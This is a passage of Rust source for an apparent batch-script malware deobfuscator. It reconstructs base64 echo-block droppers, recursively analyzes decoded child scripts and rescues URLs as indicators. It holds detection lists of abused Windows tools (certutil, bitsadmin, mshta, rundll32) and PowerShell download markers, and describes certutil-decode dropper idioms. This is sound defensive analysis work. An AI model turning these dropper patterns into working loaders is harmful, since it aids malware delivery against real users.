    let mut run = String::new();
    for &b in head {
        if (0x20..=0x7e).contains(&b) || b == b'\n' || b == b'\r' || b == b'\t' {
            run.push(b as char);
        } else {
            if run.len() >= 24 {
                deob_scan::scan_deob_text(&run, env);
            }
            run.clear();
        }
    }
    if run.len() >= 24 {
        deob_scan::scan_deob_text(&run, env);
    }
}

/// Check if a byte slice looks like a batch script by sniffing the first 256 bytes.
fn looks_like_batch(content: &[u8]) -> bool {
    let snippet = &content[..content.len().min(256)];
    let text = String::from_utf8_lossy(snippet).to_ascii_lowercase();
    let markers = [
        "@echo",
        "echo off",
        "echo on",
        "set ",
        "rem ",
        ":eof",
        "cmd /c",
        "cmd.exe",
        "powershell",
        "if defined",
        "goto ",
        "call :",
        "curl ",
        "bitsadmin",
        "certutil",
        "mshta",
        "wscript",
        "cscript",
        "regsvr32",
        "rundll32",
        "msiexec",
        "wmic ",
    ];
    markers.iter().any(|m| text.contains(m))
}

/// After `drive()` returns, walk the modified filesystem for decoded/content
/// entries that look like batch scripts and recurse into them.
#[allow(clippy::only_used_in_recursion)]
/// Pre-scan for the grouped-output-redirect idiom that base64-blob droppers
/// use to materialize a payload file:
///
/// ```text
/// (
/// echo <base64-chunk-1>
/// echo <base64-chunk-2>
/// ) > "C:\...\payload.b64"
/// ```
///
/// CMD redirects the *block's* combined stdout to the file, but harrington
/// processes each line independently, so the file would otherwise stay empty.
/// We accumulate the echo payloads (newline-joined, var-expanded) and write
/// them to the synthetic filesystem so a following `certutil -decode` / `call`
/// can resolve the file. Only blocks whose body is entirely `echo` lines are
/// captured — any other command makes the combined output ambiguous, so we
/// bail rather than guess.
#[derive(Debug, Clone, PartialEq, Eq)]
struct CapturedEchoBlock {
    open_idx: usize,
    close_idx: usize,
    target: String,
    payload_bytes: usize,
    collapsed: bool,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct CapturedEchoRun {
    start_idx: usize,
    end_idx: usize,
    target: String,
    payload_bytes: usize,
}

fn should_collapse_echo_block(payloads: &[String]) -> bool {
    const MIN_COLLAPSE_BYTES: usize = 256 * 1024;

    let total: usize = payloads.iter().map(|p| p.len()).sum();
    if total < MIN_COLLAPSE_BYTES {
        return false;
    }

    let mut base64ish = 0usize;
    let mut checked = 0usize;
    for b in payloads.iter().flat_map(|p| p.bytes()) {
        if b.is_ascii_whitespace() {
            continue;
        }
        checked += 1;
        if b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=' | b'-' | b'_') {
            base64ish += 1;
        }
    }
    checked > 0 && base64ish * 100 / checked >= 95
}

fn extract_inline_stdout_redirect(raw: &str) -> Option<(String, crate::redirect::RedirTarget)> {
    let mut in_double = false;
    let mut in_single = false;
    let mut op_start = None;
    let bytes = raw.as_bytes();
    for (idx, c) in raw.char_indices() {
        match c {
            '"' if !in_single => in_double = !in_double,
            '\'' if !in_double => in_single = !in_single,
            '>' if !in_double && !in_single => op_start = Some(idx),
            _ => {}
        }
    }
    let op = op_start?;
    if op == 0 {
        return None;
    }
    let append = bytes.get(op.wrapping_sub(1)) == Some(&b'>');
    let content_end = if append { op - 1 } else { op };
    let before_op = raw[..content_end].trim_end();
    if before_op.is_empty() {
        return None;
    }
    let mut target = raw[op + 1..].trim_start();
    if target.is_empty() {
        return None;
    }
    if let Some(rest) = target.strip_prefix('"') {
        let end = rest.find('"')?;
        target = &rest[..end];
    } else {
        target = target
            .split(|c: char| c.is_whitespace() || matches!(c, '|' | '&' | '<' | '>'))
            .next()
            .unwrap_or("");
    }
    if target.is_empty() {
        return None;
    }
    let redir = if append {
        crate::redirect::RedirTarget::Append(target.to_string())
    } else {
        crate::redirect::RedirTarget::Trunc(target.to_string())
    };
    Some((before_op.to_string(), redir))
}

fn parse_echo_redirect_line(
    line: &str,
    scratch: &mut Environment,
    target_cache: &mut std::collections::HashMap<String, String>,
) -> Option<(String, bool, String)> {
    let stripped = line.trim_start_matches(['@', ' ', '\t']);
    let (mut cleaned, mut redir) = crate::redirect::extract_redirections(stripped);
    if redir.stdout.is_none() {
        if let Some((without_redir, target)) = extract_inline_stdout_redirect(&cleaned) {
            cleaned = without_redir;
            redir.stdout = Some(target);
        }
    }
    let target = redir.stdout?;
    let payload = block_echo_payload(cleaned.trim())?;
    let target_expanded = {
        let raw_path = target.path();
        if raw_path.contains('%') || raw_path.contains('!') {
            if let Some(expanded) = target_cache.get(raw_path) {
                expanded.clone()
            } else {
                let toks = lex::lex(raw_path);
                let expanded = normalize::normalize_to_string(&toks, scratch);
                target_cache.insert(raw_path.to_string(), expanded.clone());
                expanded
            }
        } else {
            raw_path.to_string()
        }
    };
    let payload_expanded = if payload.contains('%') || payload.contains('!') {
        let toks = lex::lex(payload);
        normalize::normalize_to_string(&toks, scratch)
    } else {
        payload.to_string()
    };
    Some((target_expanded, target.append(), payload_expanded))
}

fn write_captured_echo_content(
    env: &mut Environment,
    target: &str,
    append: bool,
    mut content: Vec<u8>,
) {
    let key = target.to_ascii_lowercase();
    let cap = env.limits.max_output_bytes as usize;
    if append {
        if let Some(crate::env::FsEntry::Content {
            content: existing,
            append: prior_append,
        }) = env.modified_filesystem.get_mut(&key)
        {
            let room = cap.saturating_sub(existing.len());
            let take = content.len().min(room);
            if take > 0 {
                existing.extend_from_slice(&content[..take]);
            }
            *prior_append = true;
            return;
        }
    }
    if content.len() > cap {
        content.truncate(cap);
    }
    env.modified_filesystem
        .insert(key, crate::env::FsEntry::Content { content, append });
}

fn capture_top_level_echo_redirect_runs(
    lines: &[String],
    env: &mut Environment,
) -> Vec<CapturedEchoRun> {
    let mut scratch = env.clone();
    let mut target_cache = std::collections::HashMap::new();
    let mut captured = Vec::new();
    let mut i = 0usize;
    while i < lines.len() {
        let stripped = lines[i].trim_start_matches(['@', ' ', '\t']);
        let lower = stripped.to_ascii_lowercase();
        if lower.starts_with("set ") || lower.starts_with("set\t") || lower.starts_with("set\"") {
            crate::handlers::set::h_set(stripped, &mut scratch);
            i += 1;
            continue;
        }

        let Some((target, first_append, first_payload)) =
            parse_echo_redirect_line(&lines[i], &mut scratch, &mut target_cache)
        else {
            i += 1;
            continue;
        };

        let mut payloads = vec![first_payload];
        let mut append = first_append;
        let mut j = i + 1;
        while j < lines.len() {
            let Some((next_target, next_append, next_payload)) =
                parse_echo_redirect_line(&lines[j], &mut scratch, &mut target_cache)
            else {
                break;
            };
            if !next_target.eq_ignore_ascii_case(&target) {
                break;
            }
            append = next_append;
            payloads.push(next_payload);
            j += 1;
        }

        if payloads.len() > 1 && should_collapse_echo_block(&payloads) {
            let mut content = Vec::new();
            for payload in &payloads {
                content.extend_from_slice(payload.as_bytes());
                content.extend_from_slice(b"\r\n");
            }
            write_captured_echo_content(env, &target, append, content);
            captured.push(CapturedEchoRun {
                start_idx: i,
                end_idx: j - 1,
                target,
                payload_bytes: payloads.iter().map(|p| p.len() + 2).sum(),
            });
            i = j;
        } else {
            i += 1;
        }
    }
    captured
}

fn block_echo_payload(line: &str) -> Option<&str> {
    let bytes = line.as_bytes();
    let head = bytes.get(..4)?;
    if !head.eq_ignore_ascii_case(b"echo") {
        return None;
    }
    let rest = &line[4..];
    if rest.is_empty() {
        return Some("");
    }
    match rest.as_bytes()[0] {
        b' ' | b'\t' => Some(rest.trim_start_matches([' ', '\t'])),
        b'.' | b':' => Some(&rest[1..]),
        _ => None,
    }
}

fn capture_block_echo_redirects(lines: &[String], env: &mut Environment) -> Vec<CapturedEchoBlock> {
    // Pre-scan runs BEFORE the main interpreter, so env doesn't yet have
    // any `set _t=…` definitions from preceding lines. We need those so
    // the redirect target (`> "%_t%"`) can be var-expanded into the same
    // path the later `certutil -decode "%_t%"` will arrive at. Apply a
    // single-pass SET-only sweep into a SCRATCH env clone (not env itself
    // — the real interpreter will set the same vars and we don't want to
    // double-apply or leak side effects like trait pushes).
    let mut scratch = env.clone();
    let mut i = 0usize;
    let mut captured = Vec::new();
    while i < lines.len() {
        // Apply any leading SET lines so the redirect target expands.
        let stripped = lines[i].trim_start_matches(['@', ' ', '\t']);
        let lower = stripped.to_ascii_lowercase();
        if lower.starts_with("set ") || lower.starts_with("set\t") || lower.starts_with("set\"") {
            crate::handlers::set::h_set(stripped, &mut scratch);
        }
        let opener = lines[i].trim_start_matches(['@', ' ', '\t']).trim_end();
        // A bare `(` opens a grouped block (possibly `@(`). Anything else
        // (e.g. `if (`, `for ... (`) is handled by the normal interpreter.
        if opener != "(" {
            i += 1;
            continue;
        }
        // Scan the body, collecting echo payloads until the closing `)`.
        let mut j = i + 1;
        let mut payloads: Vec<String> = Vec::new();
        let mut body_is_all_echo = true;
        let mut close_idx: Option<usize> = None;
        while j < lines.len() {
            let body = lines[j].trim_start_matches(['@', ' ', '\t']);
            let body_trimmed = body.trim_end();
            if body_trimmed.starts_with(')') {
                close_idx = Some(j);
                break;
            }
            if let Some(payload) = block_echo_payload(body) {
                payloads.push(payload.to_string());
            } else {
                body_is_all_echo = false;
                break;
            }
            j += 1;
        }
        let Some(close) = close_idx else {
            i += 1;
            continue;
        };
        if !body_is_all_echo || payloads.is_empty() {
            i = close + 1;
            continue;
        }
        // The closing line must redirect the block's stdout to a file.
        let close_line = lines[close].trim_start_matches(['@', ' ', '\t']);
        // Strip the leading `)` then parse redirections from the remainder.
        let after_paren = close_line.trim_start_matches(')').trim();
        let (_, redir) = crate::redirect::extract_redirections(after_paren);
        let Some(target) = redir.stdout else {
            i = close + 1;
            continue;
        };
        // Var-expand the redirect target — without this, `> "%_t%"` stores
        // the file under the literal key `%_t%`, but the following
        // `certutil -decode "%_t%" "%_b%"` arrives already var-expanded
        // (the dispatcher renders the line through normalize first), so
        // the lookup misses. (Contract_Project_Agreement family.)
        let target_expanded = {
            let raw_path = target.path();
            if raw_path.contains('%') || raw_path.contains('!') {
                let toks = lex::lex(raw_path);
                normalize::normalize_to_string(&toks, &mut scratch)
            } else {
                raw_path.to_string()
            }
        };
        let target = if target.append() {
            crate::redirect::RedirTarget::Append(target_expanded)
        } else {
            crate::redirect::RedirTarget::Trunc(target_expanded)
        };
        // Build the file content: each echo line var-expanded, joined by CRLF
        // (matching CMD's per-echo newline), with a trailing CRLF.
        let mut content = String::new();
        for p in &payloads {
            if p.contains('%') || p.contains('!') {
                let toks = lex::lex(p);
                // Same scratch env as the target — keeps echo bodies that
                // reference earlier SET vars (`echo %url% > file`) consistent
                // with how the redirect target was resolved.
                let expanded = normalize::normalize_to_string(&toks, &mut scratch);
                content.push_str(&expanded);
            } else {
                content.push_str(p);
            }
            content.push_str("\r\n");
        }
        let key = target.path().to_ascii_lowercase();
        let cap = env.limits.max_output_bytes as usize;
        let mut bytes = content.into_bytes();
        if bytes.len() > cap {
            bytes.truncate(cap);
        }
        // Don't clobber an existing entry the interpreter already populated.
        env.modified_filesystem
            .entry(key)
            .or_insert(crate::env::FsEntry::Content {
                content: bytes,
                append: target.append(),
            });
        captured.push(CapturedEchoBlock {
            open_idx: i,
            close_idx: close,
            target: target.path().to_string(),
            payload_bytes: payloads.iter().map(|p| p.len() + 2).sum(),
            collapsed: should_collapse_echo_block(&payloads),
        });
        i = close + 1;
    }
    captured
}

fn analyze_extracted_payloads(env: &mut Environment, out: &mut String, depth: u32) {
    use std::collections::HashSet;
    use std::hash::{Hash, Hasher};

    fn content_fingerprint(dst: &str, content: &[u8]) -> u64 {
        let mut hasher = std::collections::hash_map::DefaultHasher::new();
        dst.hash(&mut hasher);
        content.hash(&mut hasher);
        hasher.finish()
    }

    fn walk(env: &mut Environment, out: &mut String, depth: u32, seen: &mut HashSet<u64>) {
        if depth >= 12 {
            return;
        }
        // Collect candidates first to avoid borrow conflicts.
        let candidates: Vec<(String, Vec<u8>)> = env
            .modified_filesystem
            .iter()
            .filter_map(|(k, v)| {
                let content = match v {
                    env::FsEntry::Decoded { content, .. } => Some(content.clone()),
                    env::FsEntry::Content { content, .. } if looks_like_batch(content) => {
                        Some(content.clone())
                    }
                    _ => None,
                };
                content.map(|c| (k.clone(), c))
            })
            .collect();

        for (dst, content) in candidates {
            if !looks_like_batch(&content) {
                continue;
            }
            let fp = content_fingerprint(&dst, &content);
            if !seen.insert(fp) {
                continue;
            }
            env.traits.push(Trait::RecursiveAnalysis {
                dst: dst.clone(),
                depth,
            });
            let mut child_out = String::new();
            // Check child_scripts cap before recursing.
            if env.limits.child_scripts < env.limits.max_child_scripts {
                env.limits.child_scripts += 1;
                let prev_input_bytes = env.input_bytes.clone();
                env.input_bytes = Some(std::sync::Arc::from(content.clone().into_boxed_slice()));
                drive(&content, env, &mut child_out);
                env.input_bytes = prev_input_bytes;
            }
            // Surface the recursive deob in the main output with a banner so
            // analysts can read the reconstructed child-script commands —
            // critical for certutil-decode + call droppers (Contract_Project_-
            // Agreement family) where the actual `powershell -Command "…"`
            // line lives only in the decoded payload. Without this the parent
            // deob stops at `certutil -decode …` and never reveals the
            // downstream invocation, even though URLs surface as traits.
            if !child_out.trim().is_empty() {
                out.push_str("\r\n");
                out.push_str(&format!(
                    "::==== harrington: decoded child script ({dst}) ====\r\n"
                ));
                out.push_str(&child_out);
                if !child_out.ends_with('\n') {
                    out.push_str("\r\n");
                }
                out.push_str("::==== end decoded child script ====\r\n");
            }
            let decoded_text = String::from_utf8_lossy(&content).into_owned();
            let self_iex = {
                let lc = decoded_text.to_ascii_lowercase();
                (lc.contains("readalltext") || lc.contains("get-content"))
                    && (lc.contains("%~f0") || lc.contains("%~dpnx0") || lc.contains("%~dp0"))
                    && (lc.contains("iex") || lc.contains("invoke-expression"))
            };
            if self_iex && !env.all_extracted_ps1.contains(&content) {
                env.all_extracted_ps1.push(content.clone());
            }
            deob_scan::scan_deob_text(&decoded_text, env);
            deob_scan::scan_deob_text(&child_out, env);
            deob_scan::scan_embedded_powershell_invocations(&decoded_text, env);
            // After recursion, check if new decoded files appeared (depth+1 cap).
            walk(env, out, depth + 1, seen);
        }
    }

    walk(env, out, depth, &mut HashSet::new());
}

/// Heuristic: does the input contain any `!IDENT[…]!` reference (the
/// delayed-expansion sigil — possibly with a substring/substitution tail
/// like `!VAR:OLD=NEW!` or `!VAR:~0,1!`)? Static-analysis-only — real CMD
/// requires `setlocal enabledelayedexpansion` or `cmd /v:on` to interpret
/// these. We use this as a hint to auto-enable delayed expansion when
/// neither is explicit in the input.
fn has_bang_var_reference(input: &[u8]) -> bool {
    use once_cell::sync::Lazy;
    use regex::bytes::Regex;
    #[allow(clippy::expect_used)]
    static BANG_RE: Lazy<Regex> = Lazy::new(|| {
        // `!IDENT!`  or  `!IDENT:…!`  (the `:` form is substring/substitution
        // and is just as much a delayed-expansion construct as plain `!X!`).
        Regex::new(r"![A-Za-z_][A-Za-z0-9_]*(?:[:~][^!\r\n]{0,80})?!").expect("bang re")
    });
    BANG_RE.is_match(input)
}

/// `setlocal disabledelayedexpansion` is the explicit opt-out the
/// auto-enable above should respect. Any single occurrence stops us from
/// touching the flag.
fn has_disable_delayed_expansion(input: &[u8]) -> bool {
    use once_cell::sync::Lazy;
    use regex::bytes::Regex;
    #[allow(clippy::expect_used)]
    static DIS_RE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r"(?i)setlocal\s+disabledelayedexpansion").expect("dis re"));
    DIS_RE.is_match(input)
}

/// Truncate a single output line if it exceeds `env.limits.max_output_line_bytes`.
/// Emits `Trait::LineTruncated` on first truncation and appends "…[truncated]".
/// Before dropping the tail, scans it for `http(s)://`/`ftp://`/`file://`
/// URLs and emits `Trait::DownloadInDeobText` for each one so we don't
/// silently lose IOCs from single-line JS/PS payloads (the QF-Z2-MR family
/// is one 582 KB JS line with `0zz0.com` URLs deep in the tail).
fn cap_line(line: String, env: &mut Environment) -> String {
    if let Some(summary) = summarize_base64_pe_carrier_line(&line) {
        return summary;
    }
    let limit = env.limits.max_output_line_bytes;
    if limit == 0 || line.len() as u64 <= limit {
        return line;
    }
    if let Some(summary) = summarize_expanded_long_alpha_echo_line(&line, env) {
        return summary;
    }
    let n = limit as usize;
    let mut end = n.min(line.len());
    while end > 0 && !line.is_char_boundary(end) {
        end -= 1;
    }
    env.traits.push(crate::traits::Trait::LineTruncated {
        original_len: line.len() as u64,
    });
    // Rescue URLs from the dropped tail before throwing it away.
    let tail = &line[end..];
    if !tail.is_empty() {
        rescue_truncated_urls(tail, line.len(), env);
    }
    let mut s = line[..end].to_string();
    s.push_str("…[truncated]");
    s
}

fn summarize_expanded_long_alpha_echo_line(line: &str, env: &mut Environment) -> Option<String> {
    const MIN_SUMMARY_BYTES: usize = 1024;

    let limit = env.limits.max_output_line_bytes as usize;
    let stripped = line.trim_start_matches(['@', ' ', '\t']);
    let payload = block_echo_payload(stripped)?;
    if payload.len() < MIN_SUMMARY_BYTES || payload.len() < limit {
        return None;
    }
    if !looks_like_long_alpha_noise(payload) {
        return None;
    }

    env.traits.push(crate::traits::Trait::LineTruncated {
        original_len: line.len() as u64,
    });
    rescue_truncated_urls(payload, line.len(), env);
    Some(format!(
        "::==== harrington: omitted {} bytes from long alpha echo line ====",
        payload.len()
    ))
}

fn looks_like_long_alpha_noise(payload: &str) -> bool {
    let mut non_ws = 0usize;
    let mut alpha = 0usize;
    let mut current_alpha_run = 0usize;
    let mut longest_alpha_run = 0usize;

    for &b in payload.as_bytes() {
        if b.is_ascii_whitespace() {
            current_alpha_run = 0;
            continue;
        }
        if matches!(
            b,
            b'%' | b'!' | b'^' | b'&' | b'|' | b'<' | b'>' | b'+' | b'='
        ) {
            return false;
        }
        non_ws += 1;
        if b.is_ascii_alphabetic() {
            alpha += 1;
            current_alpha_run += 1;
            longest_alpha_run = longest_alpha_run.max(current_alpha_run);
        } else {
            current_alpha_run = 0;
        }
    }

    non_ws >= 1024 && longest_alpha_run >= 1024 && alpha.saturating_mul(100) >= non_ws * 90
}

fn fast_expand_percent_substr_chain_line(line: &str, env: &Environment) -> Option<String> {
    if line.len() < 128 || !line.contains(":~") {
        return None;
    }

    let mut out = String::with_capacity(line.len().min(128 * 1024));
    let mut cursor = 0usize;
    let mut refs = 0usize;
    while cursor < line.len() {
        let rest = &line[cursor..];
        let Some(first) = rest.chars().next() else {
            break;
        };
        if first.is_whitespace() {
            out.push(first);
            cursor += first.len_utf8();
            continue;
        }
        if first != '%' {
            return None;
        }

        let name_start = cursor + 1;
        let after_start = &line[name_start..];
        let colon_rel = after_start.find(':')?;
        let name_end = name_start + colon_rel;
        if name_end == name_start {
            return None;
        }
        let op_start = name_end + 1;
        let op_rest = &line[op_start..];
        if !op_rest.trim_start().starts_with('~') {
            return None;
        }
        let close_rel = op_rest.find('%')?;
        let op_end = op_start + close_rel;
        let op = &line[op_start..op_end];
        let crate::lex::VarOp::Substr { index, length } = crate::lex::parse_substr(op)? else {
            return None;
        };
        let raw = env.get(&line[name_start..name_end])?;
        out.push_str(&crate::normalize::apply_substr(&raw, index, length));
        refs += 1;
        cursor = op_end + 1;
    }

    (refs >= 8).then_some(out)
}

fn fast_expand_percent_var_chain_line(line: &str, env: &Environment) -> Option<String> {
    if line.len() < 128 || !line.contains('%') {
        return None;
    }

    let mut out = String::with_capacity(line.len().min(128 * 1024));
    let mut cursor = 0usize;
    let mut refs = 0usize;
    while cursor < line.len() {
        let rest = &line[cursor..];
        let Some(first) = rest.chars().next() else {
            break;
        };
        if first.is_whitespace() {
            out.push(first);
            cursor += first.len_utf8();
            continue;
        }
        if first != '%' {
            return None;
        }

        let name_start = cursor + 1;
        let after_start = &line[name_start..];
        let close_rel = after_start.find('%')?;
        let name_end = name_start + close_rel;
        if name_end == name_start {
            return None;
        }
        let name = &line[name_start..name_end];
        if name.contains([':', '!', '^', '&', '|', '<', '>', '"']) {
            return None;
        }
        if let Some(value) = env.get(name) {
            out.push_str(&value);
        }
        refs += 1;
        cursor = name_end + 1;
    }

    (refs >= 16).then_some(out)
}

/// Extract `http(s)/ftp/file` URLs from a fragment that's about to be
/// thrown away by `cap_line` and emit them as `Trait::DownloadInDeobText`.
/// Uses the same noise filter and dedup logic as the post-pass URL sweep
/// so analyst output stays consistent.
fn rescue_truncated_urls(tail: &str, full_len: usize, env: &mut Environment) {
    use crate::deob_scan::{is_noise_url, is_noise_url_context, URL_RE};
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for caps in URL_RE.captures_iter(tail) {
        let Some(m) = caps.get(1) else { continue };
        let mut url = m.as_str().to_string();
        while let Some(last) = url.chars().last() {
            if matches!(
                last,
                ',' | '.' | ';' | ':' | ')' | ']' | '}' | '"' | '\'' | '!' | '?' | '\\'
            ) {
                url.pop();
            } else {
                break;
            }
        }
        if url.len() < 8 || is_noise_url(&url) {
            continue;
        }
        if known.contains(&url) || !seen.insert(url.clone()) {
            continue;
        }
        let line_hint = format!("(rescued from {full_len}-byte truncated line)");
        if is_noise_url_context(&line_hint, &url) {
            continue;
        }
        env.traits.push(crate::traits::Trait::DownloadInDeobText {
            src: url,
            line_hint,
        });
    }
}

fn render_fast_long_plain_echo(cmd: &str, env: &mut Environment) -> Option<String> {
    let limit = env.limits.max_output_line_bytes;
    if limit == 0 || cmd.len() as u64 <= limit {
        return None;
    }

    let stripped = cmd.trim_start_matches(['@', ' ', '\t']);
    if stripped
        .bytes()
        .any(|b| matches!(b, b'%' | b'!' | b'^' | b'&' | b'|' | b'<' | b'>'))
    {
        return None;
    }

    let payload = block_echo_payload(stripped)?;
    if payload.len() < limit as usize {
        return None;
    }

    env.traits.push(crate::traits::Trait::LineTruncated {
        original_len: cmd.len() as u64,
    });
    rescue_truncated_urls(payload, cmd.len(), env);
    Some(format!(
        "::==== harrington: omitted {} bytes from long echo line ====",
        payload.len()
    ))
}

fn summarize_large_pem_blocks(text: &str) -> String {
    const MIN_SUMMARY_BYTES: usize = 32 * 1024;

    if !text.contains("-----BEGIN ") {
        return text.to_string();
    }

    let mut out = String::with_capacity(text.len().min(128 * 1024));
    let mut lines = text.split_inclusive('\n');
    while let Some(line) = lines.next() {
        let Some((end_marker, label)) = pem_end_marker(line) else {
            out.push_str(line);
            continue;
        };

        let begin_line = line;
        let mut body_prefix = String::new();
        let mut body_bytes = 0usize;
        let mut end_line = None;
        for body_line in lines.by_ref() {
            if body_line.contains(end_marker) {
                end_line = Some(body_line);
                break;
            }
            body_bytes += body_line.len();
            if body_bytes < MIN_SUMMARY_BYTES {
                body_prefix.push_str(body_line);
            }
        }

        let Some(end_line) = end_line else {
            out.push_str(begin_line);
            out.push_str(&body_prefix);
            continue;
        };

        out.push_str(begin_line);
        if body_bytes >= MIN_SUMMARY_BYTES {
            out.push_str(&format!(
                "::==== harrington: omitted {body_bytes} bytes from {label} body ====\r\n"
            ));
        } else {
            out.push_str(&body_prefix);
        }
        out.push_str(end_line);
    }
    out
}

fn summarize_long_rem_comment_lines(text: &str, env: &mut Environment) -> String {
    const MIN_SUMMARY_BYTES: usize = 1024;

    if !contains_rem_comment_candidate(text) {
        return text.to_string();
    }

    let mut out = String::with_capacity(text.len().min(256 * 1024));
    for line in text.split_inclusive('\n') {
        let (body, eol) = split_line_ending(line);
        let trimmed = body.trim_start_matches(['@', ' ', '\t']);
        let leading_len = body.len() - trimmed.len();
        let lower = trimmed.to_ascii_lowercase();
        if !lower.starts_with("rem ") {
            out.push_str(line);
            continue;
        }

        let payload = &trimmed[4..];
        if payload.len() < MIN_SUMMARY_BYTES {
            out.push_str(line);
            continue;
        }

        rescue_truncated_urls(payload, body.len(), env);
        out.push_str(&body[..leading_len]);
        out.push_str("rem ::==== harrington: omitted ");
        out.push_str(&payload.len().to_string());
        out.push_str(" bytes from long REM comment line ====");
        out.push_str(eol);
    }
    out
}

fn large_pem_block_summary_at(lines: &[String], start_idx: usize) -> Option<(usize, String)> {
    const MIN_SUMMARY_BYTES: usize = 32 * 1024;

    let line = lines.get(start_idx)?;
    let (end_marker, label) = pem_end_marker(line)?;
    let mut body_bytes = 0usize;
    for (idx, body_line) in lines.iter().enumerate().skip(start_idx + 1) {
        if body_line.contains(end_marker) {
            if body_bytes >= MIN_SUMMARY_BYTES {
                return Some((
                    idx,
                    format!("::==== harrington: omitted {body_bytes} bytes from {label} body ===="),
                ));
            }
            return None;
        }
        body_bytes += body_line.len() + 2;
    }
    None
}

fn summarize_binary_noise_line_runs(text: &str, env: &mut Environment) -> String {
    let mut out = String::with_capacity(text.len().min(512 * 1024));
    let mut pending = String::new();
    let mut pending_lines = 0usize;

    for line in text.split_inclusive('\n') {
        let (body, _) = split_line_ending(line);
        if is_binary_noise_line(body) {
            pending.push_str(line);
            pending_lines += 1;
            continue;
        }
        flush_binary_noise_run(&mut out, &mut pending, &mut pending_lines, env);
        out.push_str(line);
    }
    flush_binary_noise_run(&mut out, &mut pending, &mut pending_lines, env);
    out
}

fn summarize_nul_padding_lines(text: &str, env: &mut Environment) -> String {
    const MIN_NUL_PADDING_BYTES: usize = 1024;

    if !text.as_bytes().contains(&0) {
        return text.to_string();
    }

    let mut out = String::with_capacity(text.len().min(256 * 1024));
    for line in text.split_inclusive('\n') {
        let (body, newline) = split_line_ending(line);
        let Some(first_nul) = body.as_bytes().iter().position(|&b| b == 0) else {
            out.push_str(line);
            continue;
        };
        let tail = &body[first_nul..];
        let nul_count = tail.as_bytes().iter().filter(|&&b| b == 0).count();
        if tail.len() < MIN_NUL_PADDING_BYTES || nul_count * 100 < tail.len() * 90 {
            out.push_str(line);
            continue;
        }

        let prefix = body[..first_nul].trim_end();
        if !prefix.is_empty() {
            out.push_str(prefix);
            out.push_str("\r\n");
        }
        rescue_truncated_urls(tail, body.len(), env);
        env.traits.push(crate::traits::Trait::LineTruncated {
            original_len: body.len() as u64,
        });
        out.push_str(&format!(
            "::==== harrington: omitted {} NUL padding bytes ====",
            tail.len()
        ));
        out.push_str(newline);
    }
    out
}

fn summarize_self_tail_base64_payloads(text: &str, env: &mut Environment) -> String {
    const MIN_B64_RUN: usize = 80;
    const MAX_B64_RUN: usize = 16 * 1024 * 1024;

    if !looks_like_self_tail_base64_loader_text(text) {
        return text.to_string();
    }

    let mut changed = false;
    let mut out = String::with_capacity(text.len().min(256 * 1024));
    for line in text.split_inclusive('\n') {
        let (body, newline) = split_line_ending(line);
        let trimmed = body.trim();
        let (candidate, was_capped) = trimmed
            .strip_suffix("…[truncated]")
            .map(|prefix| (prefix, true))
            .unwrap_or((trimmed, false));
        if !(MIN_B64_RUN..=MAX_B64_RUN).contains(&candidate.len())
            || !candidate.bytes().all(is_base64_byte)
        {
            out.push_str(line);
            continue;
        }

        use base64::Engine as _;
        let decoded = if was_capped {
            None
        } else {
            let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(candidate) else {
                out.push_str(line);
                continue;
            };
            if decoded.len() > 12 * 1024 * 1024 || !looks_like_powershell_payload_bytes(&decoded) {
                out.push_str(line);
                continue;
            }
            Some(decoded)
        };
        if was_capped
            && !env
                .all_extracted_ps1
                .iter()
                .any(|ps| looks_like_powershell_payload_bytes(ps))
        {
            out.push_str(line);
            continue;
        }

        let leading_len = body.find(trimmed).unwrap_or(0);
        out.push_str(&body[..leading_len]);
        if let Some(decoded) = decoded {
            out.push_str(&format!(
                "::==== harrington: omitted self-tail base64 payload ({} bytes encoded, {} bytes decoded) ====",
                candidate.len(),
                decoded.len()
            ));
            rescue_truncated_urls(&String::from_utf8_lossy(&decoded), body.len(), env);
        } else {
            out.push_str(&format!(
                "::==== harrington: omitted self-tail base64 payload (at least {} bytes encoded) ====",
                candidate.len()
            ));
        }
        out.push_str(newline);
        env.traits.push(crate::traits::Trait::LineTruncated {
            original_len: body.len() as u64,
        });
        changed = true;
    }

    if changed {
        out
    } else {
        text.to_string()
    }
}

fn looks_like_self_tail_base64_loader_text(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    lower.contains("get-content") && lower.contains("-raw") && lower.contains("frombase64string")
}

fn looks_like_powershell_payload_bytes(bytes: &[u8]) -> bool {
    let text = if bytes.starts_with(&[0xff, 0xfe]) {
        String::from_utf16_lossy(
            &bytes[2..]
                .chunks_exact(2)
                .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
                .collect::<Vec<_>>(),
        )
    } else {
        String::from_utf8_lossy(bytes).into_owned()
    };
    let lower = text.to_ascii_lowercase();
    lower.contains("powershell")
        || lower.contains("invoke-expression")
        || lower.contains("invoke-webrequest")
        || lower.contains("new-object")
        || lower.contains("frombase64string")
        || lower.contains("downloadstring")
        || lower.contains('$')
}

fn is_base64_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=')
}

fn flush_binary_noise_run(
    out: &mut String,
    pending: &mut String,
    pending_lines: &mut usize,
    env: &mut Environment,
) {
    if pending.is_empty() {
        return;
    }
    if *pending_lines >= 32 && pending.len() >= 1024 {
        rescue_truncated_urls(pending, pending.len(), env);
        out.push_str(&format!(
            "::==== harrington: omitted {} binary-looking lines ({} bytes) ====\r\n",
            *pending_lines,
            pending.len()
        ));
    } else {
        out.push_str(pending);
    }
    pending.clear();
    *pending_lines = 0;
}

fn is_binary_noise_line(line: &str) -> bool {
    let trimmed = line.trim();
    if trimmed.is_empty() || trimmed.len() < 4 {
        return false;
    }
    let bytes = trimmed.as_bytes();
    let suspicious = bytes
        .iter()
        .filter(|&&b| (b < 0x20 && b != b'\t') || b >= 0x7f)
        .count();
    suspicious * 3 >= bytes.len()
}

fn contains_rem_comment_candidate(text: &str) -> bool {
    text.as_bytes()
        .windows(4)
        .any(|w| matches!(w, [b'r' | b'R', b'e' | b'E', b'm' | b'M', b' ']))
}

fn split_line_ending(line: &str) -> (&str, &str) {
    if let Some(body) = line.strip_suffix("\r\n") {
        (body, "\r\n")
    } else if let Some(body) = line.strip_suffix('\n') {
        (body, "\n")
    } else {
        (line, "")
    }
}

